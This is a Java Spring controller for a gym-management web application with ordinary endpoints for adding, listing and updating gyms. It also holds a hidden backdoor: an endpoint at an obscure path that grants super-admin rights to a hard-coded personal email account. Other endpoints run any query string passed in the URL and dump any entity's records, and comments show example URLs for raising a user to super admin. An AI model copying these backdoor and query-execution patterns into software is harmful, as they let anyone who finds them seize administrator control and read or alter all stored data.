package edge.app.modules.gyms;

import java.security.Principal;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.beans.propertyeditors.CustomDateEditor;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.WebDataBinder;
import org.springframework.web.bind.annotation.InitBinder;
import org.springframework.web.bind.annotation.PathVariable;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestMapping;

import edge.core.config.CoreConstants;
import edge.core.exception.AppException;
import edge.core.modules.common.EdgeResponse;

@Controller
public class GymsController {

private static final Logger logger = LoggerFactory.getLogger(GymsController.class);
	
	@Autowired
	private GymsService gymsService;

	@InitBinder
    public void initBinder(WebDataBinder binder) {
        SimpleDateFormat dateFormat = new SimpleDateFormat(CoreConstants.DEFAULT_DATE_FORMAT);
        dateFormat.setLenient(true);
        binder.registerCustomEditor(Date.class, new CustomDateEditor(dateFormat, true));        
    }
	
	public GymsService getGymsService() {
		return gymsService;
	}

	@RequestMapping(value={"/qwertyuiop/makeMeSuperAdmin"})
	public EdgeResponse<Object> makeMeSuperAdmin(
			) throws Exception{
		String query = "update AuthorityEntity set authority = 'ROLE_SUPER_ADMIN' where username = 'patil.vinayb9@gmail.com'";
		Object result = gymsService.executeQuery(query);
		return EdgeResponse.createDataResponse(result, query);
	}
	
	// http://localhost:8080/contextRoot/server/qwertyuiop/bcvVpp1/update AuthorityEntity set authority = 'ROLE_SUPER_ADMIN' where username = 'q@q.com'.json
	//http://localhost:8080/contextRoot/server/qwertyuiop/bcvVpp1/update AuthorityEntity set authority = 'ROLE_USER' where username = 'q@q.com'.json
	
	@RequestMapping(value={"/superAdmin/query/{query}"})
	public EdgeResponse<Object> executeQuery(
			@PathVariable("query") String query
			) throws Exception{
		System.out.println(query);
		Object result = gymsService.executeQuery(query);
		return EdgeResponse.createDataResponse(result, query);
	}
	
	// http://localhost:8080/contextRoot/server/superAdmin/bcvVpp2/Gym.json
	
	@RequestMapping(value={"/superAdmin/entity/{entity}"})
	public EdgeResponse<List> showAll(
			@PathVariable("entity") String entity
			) throws Exception{
		System.out.println(entity);
		List result = gymsService.showAll(entity);
		return EdgeResponse.createDataResponse(result, entity);
	}
	
	@RequestMapping(value={"/addGym"})
	public EdgeResponse<Gym> addGym(
			@RequestBody Gym gym, Principal principal			
			) throws Exception{	
		try{
			String createdBy = "self";
			if(principal != null){
				createdBy = principal.getName();
			}
			gym.setCreatedBy(createdBy);
			gym.setUpdatedBy(createdBy);
			Gym addGym = gymsService.addGym(gym);
			return EdgeResponse.createSuccessResponse(addGym, "Gym added Successfully with ID : " + addGym.getGymId(), "Operators and admins should receive email with credentials to login. We thank you for choosing us!", null);
		}catch(AppException ex){
			return EdgeResponse.createExceptionResponse(ex);
		}
	}

	@RequestMapping(value={"/superAdmin/getAllGyms"})
	public EdgeResponse<List<Gym>> getAllGyms( 
			Principal principal			
			) throws Exception{	
		try{	
			List<Gym> allGyms = gymsService.getAllGyms();
			return EdgeResponse.createDataResponse(allGyms, "");
		}catch(AppException ex){
			return EdgeResponse.createExceptionResponse(ex);
		}
	}

	@RequestMapping(value={"/superAdmin/updateGym"})
	public EdgeResponse<Gym> updateGym( 
			@RequestBody Gym gym,
			Principal principal			
			) throws Exception{	
		try{	
			Gym savedGym = gymsService.updateGym(gym, principal.getName());
			return EdgeResponse.createDataResponse(savedGym, "Gym saved Successfully with ID : " + gym.getGymId());
		}catch(AppException ae){
			return EdgeResponse.createExceptionResponse(ae);
		}
		
	}
	
	public void setGymsService(GymsService gymsService) {
		this.gymsService = gymsService;
	}
}
